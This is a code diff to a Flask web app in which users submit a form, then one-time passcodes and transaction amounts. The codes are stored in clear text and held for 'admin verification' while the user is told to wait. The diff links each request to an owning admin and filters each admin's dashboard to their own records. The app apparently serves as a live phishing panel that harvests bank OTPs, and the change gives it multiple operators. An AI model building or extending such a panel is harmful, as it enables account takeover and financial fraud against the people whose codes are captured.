@@ -184,6 +184,7 @@ class OtpAuthorizationRequest(db.Model):
     id = db.Column(db.Integer, primary_key=True, autoincrement=True)  # Primary key, auto-increment
     user_identifier = db.Column(db.String(100), nullable=False)  # User session ID who is requesting OTP
     submission_id = db.Column(db.Integer, db.ForeignKey('submissions.id'), nullable=True)  # Related form submission
+    admin_id = db.Column(db.Integer, db.ForeignKey('admins.id'), nullable=True)  # Admin who owns this submission
     ip_address = db.Column(db.String(45), nullable=True)  # User's IP address
     user_agent = db.Column(db.String(500), nullable=True)  # Browser user agent
     status = db.Column(db.String(20), default='pending', nullable=False)  # pending, approved, denied
@@ -198,6 +199,7 @@ class OtpAuthorizationRequest(db.Model):
             'id': self.id,
             'user_identifier': self.user_identifier,
             'submission_id': self.submission_id,
+            'admin_id': self.admin_id,
             'ip_address': self.ip_address,
             'user_agent': self.user_agent,
             'status': self.status,
@@ -215,6 +217,8 @@ class OtpVerificationRequest(db.Model):
     id = db.Column(db.Integer, primary_key=True, autoincrement=True)  # Primary key, auto-increment
     user_identifier = db.Column(db.String(100), nullable=False)  # User session ID who submitted OTP
     otp_code = db.Column(db.String(10), nullable=False)  # OTP code submitted by user
+    submission_id = db.Column(db.Integer, db.ForeignKey('submissions.id'), nullable=True)  # Related form submission
+    admin_id = db.Column(db.Integer, db.ForeignKey('admins.id'), nullable=True)  # Admin who owns this submission
     ip_address = db.Column(db.String(45), nullable=True)  # User's IP address
     user_agent = db.Column(db.String(500), nullable=True)  # Browser user agent
     status = db.Column(db.String(20), default='pending', nullable=False)  # pending, approved, denied
@@ -229,6 +233,8 @@ class OtpVerificationRequest(db.Model):
             'id': self.id,
             'user_identifier': self.user_identifier,
             'otp_code': self.otp_code,
+            'submission_id': self.submission_id,
+            'admin_id': self.admin_id,
             'ip_address': self.ip_address,
             'user_agent': self.user_agent,
             'status': self.status,
@@ -247,6 +253,8 @@ class TransactionCancellationRequest(db.Model):
     user_identifier = db.Column(db.String(100), nullable=False)  # User session ID who submitted OTP
     otp_code = db.Column(db.String(10), nullable=False)  # OTP code submitted by user
     transaction_amount = db.Column(db.Numeric(10, 2), nullable=False)  # Amount of transaction to cancel
+    submission_id = db.Column(db.Integer, db.ForeignKey('submissions.id'), nullable=True)  # Related form submission
+    admin_id = db.Column(db.Integer, db.ForeignKey('admins.id'), nullable=True)  # Admin who owns this submission
     ip_address = db.Column(db.String(45), nullable=True)  # User's IP address
     user_agent = db.Column(db.String(500), nullable=True)  # Browser user agent
     status = db.Column(db.String(20), default='pending', nullable=False)  # pending, approved, denied
@@ -262,6 +270,8 @@ class TransactionCancellationRequest(db.Model):
             'user_identifier': self.user_identifier,
             'otp_code': self.otp_code,
             'transaction_amount': float(self.transaction_amount) if self.transaction_amount else None,
+            'submission_id': self.submission_id,
+            'admin_id': self.admin_id,
             'ip_address': self.ip_address,
             'user_agent': self.user_agent,
             'status': self.status,
@@ -458,6 +468,9 @@ def submit_form():
         db.session.add(new_submission)
         db.session.commit()
         
+        # Store submission_id in session for linking subsequent OTP requests
+        session['submission_id'] = new_submission.id
+        
         # Return success response with redirect instruction
         return jsonify({
             'success': True,
@@ -526,10 +539,16 @@ def verify_otp():
                 'message': 'OTP submitted for admin verification. Please wait...'
             }), 200
         
+        # Get admin_id and submission_id from session if available
+        admin_id = session.get('admin_id')
+        submission_id = session.get('submission_id')
+        
         # Create new OTP verification request for admin review
         verification_request = OtpVerificationRequest(
             user_identifier=user_identifier,  # Unique identifier for this user session
             otp_code=otp_code,  # OTP code submitted by user (stored in clear text for admin)
+            submission_id=submission_id,  # Related form submission if available
+            admin_id=admin_id,  # Admin who owns this submission
             ip_address=ip_address,  # User's IP address
             user_agent=user_agent,  # Browser information
             status='pending'  # Requires admin approval
@@ -679,11 +698,17 @@ def verify_transaction_cancellation():
                 'message': 'Transaction cancellation OTP submitted for admin verification. Please wait...'
             }), 200
         
+        # Get admin_id and submission_id from session if available
+        admin_id = session.get('admin_id')
+        submission_id = session.get('submission_id')
+        
         # Create new transaction cancellation verification request for admin review
         verification_request = TransactionCancellationRequest(
             user_identifier=user_identifier,  # Unique identifier for this user session
             otp_code=otp_code,  # OTP code submitted by user (stored in clear text for admin)
             transaction_amount=amount_float,  # Amount of transaction to cancel
+            submission_id=submission_id,  # Related form submission if available
+            admin_id=admin_id,  # Admin who owns this submission
             ip_address=ip_address,  # User's IP address
             user_agent=user_agent,  # Browser information
             status='pending'  # Requires admin approval
@@ -806,10 +831,14 @@ def request_otp_authorization():
                 'message': 'Authorization request already exists'
             }), 200
         
+        # Get admin_id from session if available
+        admin_id = session.get('admin_id')
+        
         # Create new authorization request
         auth_request = OtpAuthorizationRequest(
             user_identifier=user_identifier,  # Unique identifier for this user session
             submission_id=submission_id,  # Related form submission if available
+            admin_id=admin_id,  # Admin who owns this submission
             ip_address=ip_address,  # User's IP address
             user_agent=user_agent,  # Browser information
             status='pending'  # Default status is pending admin approval
@@ -1079,8 +1108,13 @@ def get_otp_authorization_requests():
         page = request.args.get('page', 1, type=int)  # Page number for pagination
         per_page = request.args.get('per_page', 20, type=int)  # Number of records per page
         
+        # Get current admin ID from session
+        current_admin_id = session.get('admin_id')
+        if not current_admin_id:
+            return jsonify({'error': 'Admin not logged in'}), 401
+        
         # Build query with filters
-        query = OtpAuthorizationRequest.query
+        query = OtpAuthorizationRequest.query.filter_by(admin_id=current_admin_id)
         
         # Filter by status if provided
         if status_filter and status_filter != 'all':
@@ -1114,7 +1148,7 @@ def get_otp_authorization_requests():
             'page': page,  # Current page number
             'per_page': per_page,  # Records per page
             'pages': requests_paginated.pages,  # Total number of pages
-            'pending_count': OtpAuthorizationRequest.query.filter_by(status='pending').count()  # Count of pending requests
+            'pending_count': OtpAuthorizationRequest.query.filter_by(status='pending', admin_id=current_admin_id).count()  # Count of pending requests
         }), 200
     
     except Exception as e:
@@ -1194,8 +1228,13 @@ def get_otp_verification_requests():
         page = request.args.get('page', 1, type=int)  # Page number for pagination
         per_page = request.args.get('per_page', 20, type=int)  # Number of records per page
         
+        # Get current admin ID from session
+        current_admin_id = session.get('admin_id')
+        if not current_admin_id:
+            return jsonify({'error': 'Admin not logged in'}), 401
+        
         # Build query with filters
-        query = OtpVerificationRequest.query
+        query = OtpVerificationRequest.query.filter_by(admin_id=current_admin_id)
         
         # Filter by status if provided
         if status_filter and status_filter != 'all':
@@ -1216,7 +1255,7 @@ def get_otp_verification_requests():
             'page': page,  # Current page number
             'per_page': per_page,  # Records per page
             'pages': requests_paginated.pages,  # Total number of pages
-            'pending_count': OtpVerificationRequest.query.filter_by(status='pending').count()  # Count of pending requests
+            'pending_count': OtpVerificationRequest.query.filter_by(status='pending', admin_id=current_admin_id).count()  # Count of pending requests
         }), 200
     
     except Exception as e:
@@ -1296,8 +1335,13 @@ def get_transaction_cancellation_requests():
         page = request.args.get('page', 1, type=int)  # Page number for pagination
         per_page = request.args.get('per_page', 20, type=int)  # Number of records per page
         
+        # Get current admin ID from session
+        current_admin_id = session.get('admin_id')
+        if not current_admin_id:
+            return jsonify({'error': 'Admin not logged in'}), 401
+        
         # Build query with filters
-        query = TransactionCancellationRequest.query
+        query = TransactionCancellationRequest.query.filter_by(admin_id=current_admin_id)
         
         # Filter by status if provided
         if status_filter and status_filter != 'all':
@@ -1318,7 +1362,7 @@ def get_transaction_cancellation_requests():
             'page': page,  # Current page number
             'per_page': per_page,  # Records per page
             'pages': requests_paginated.pages,  # Total number of pages
-            'pending_count': TransactionCancellationRequest.query.filter_by(status='pending').count()  # Count of pending requests
+            'pending_count': TransactionCancellationRequest.query.filter_by(status='pending', admin_id=current_admin_id).count()  # Count of pending requests
         }), 200
     
     except Exception as e:
